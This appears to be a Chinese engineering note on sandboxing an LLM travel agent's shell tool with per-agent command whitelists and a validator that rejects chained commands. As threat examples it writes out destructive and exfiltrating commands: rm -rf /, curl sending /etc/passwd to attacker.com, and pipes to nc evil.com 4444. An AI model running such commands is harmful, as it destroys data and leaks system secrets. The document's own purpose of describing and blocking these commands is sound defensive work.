---
title: "✅Harness工程——命令执行的安全护栏"
---

# ✅Harness工程——命令执行的安全护栏

给 Agent 配备 Shell 执行能力是把双刃剑。一方面，它让 Agent 能调用外部 CLI（搜机票、订酒店、查火车票）——这些第三方服务只有 CLI 接口，没有原生 SDK。另一方面，LLM 具有不可控性——它可能生成任何命令：rm -rf /、curl http://attacker.com/exfil?data=$(cat /etc/passwd)、pip install malware-package。

传统的解决方案是"完全禁止 Shell"，但 gogo-agent 的业务场景决定了必须保留 Shell 能力（tuniu-cli / rgh-cli / flight-cli 都是命令行工具）。于是问题变成：**如何在保留 Shell 能力的同时，把 LLM 能做的事限定在一个安全边界内？**

命令白名单

安全的第一道防线是 AgentScope 框架的 ShellCommandTool——它只允许执行白名单内的可执行文件。

gogo-agent 中仅有两个 Agent 持有 Shell 执行能力，且各自的白名单严格不同：

**ItineraryPlanAgent**：

```text
ShellCommandTool shellTool = new ShellCommandTool(
    null,  // baseDir: 由 SkillBox 在 enable() 时覆盖为工作目录
    Set.of("curl", "npm", "tuniu", "rgh", "nohup", "sleep",
           "cat", "grep", "node", "date", "env", "which", "bash", "ls"),
    null); // approvalCallback: 无用户审批回调
```

**BookingAgent**：

```text
ShellCommandTool shellTool = new ShellCommandTool(
    null,
    Set.of("tuniu", "env", "bash", "cat", "grep", "date", "which", "ls"),
    null);
```

对比可见：BookingAgent 的白名单更窄——没有 curl（不需要直接请求外部 API）、没有 rgh（不操作酒店 CLI）、没有 npm/node/nohup/sleep（不需要运行 Node.js 脚本或后台进程）。

**其余 4 个 Agent 完全没有 Shell 访问权**：

| Agent | Shell 访问 | 原因 |
| --- | --- | --- |
| MasterAgent | 无 | 仅做路由调度，通过子智能体间接工作 |
| ItineraryManageAgent | 无 | 操作差旅单/审批单，走 Java @Tool |
| SubjectiveAssessorAgent | 无 | 审核方案，走 Java @Tool（从 Redis 取数据） |
| InfoAgent | 无 | 查天气/签证/新闻，走 MCP 客户端 |

**白名单的底层验证**——UnixCommandValidator.validate() 的关键逻辑：

1. 从命令字符串提取第一个 token 作为可执行文件名（去引号、去 .sh/.py/.rb 后缀）
2. 如果白名单为空/null → 允许所有（向后兼容，gogo-agent **不使用**此模式）
3. 检查提取出的可执行文件名是否在 allowedCommands 集合中
4. 不在 → 返回 ValidationResult.rejected("Command not in allowed list")

被拒绝后，ShellCommandTool.executeShellCommand() 返回：

```text
returncode: -1
stdout: (empty)
stderr: SecurityError: Command 'python' is not allowed. Allowed commands: [tuniu, env, bash, ...]
```

LLM 会看到这个错误消息——告知它该命令被禁止，引导它使用白名单内的工具。

链式命令拦截——阻断组合攻击

白名单只验证第一个 token。如果 LLM 生成 tuniu search; rm -rf /，第一个 token 是 tuniu（白名单内），但分号后的 rm -rf / 会被 shell 执行。

UnixCommandValidator 的第二道检查专门应对这个威胁——**多命令检测**：

扫描命令字符串，检测引号外的 &、|、;、\n 字符。一旦发现，立即拒绝：

SecurityError: Multiple commands detected (contains '&' or '|' or ';' or newline outside quotes)

这意味着以下攻击向量全部无效：

```text
tuniu search ; curl http://evil.com         # 分号链接 → 拒绝
tuniu search | nc evil.com 4444             # 管道 → 拒绝
tuniu search & rm -rf /                     # 后台链接 → 拒绝
tuniu search
rm -rf /                                    # 换行注入 → 拒绝
```

Hook 秘钥注入

用户级隔离——多租户安全

---

来源: https://thoughts.aliyun.com/workspaces/6963289eb0fc2e001bb052eb/docs/6a6883c5d31fed0001d47c4a
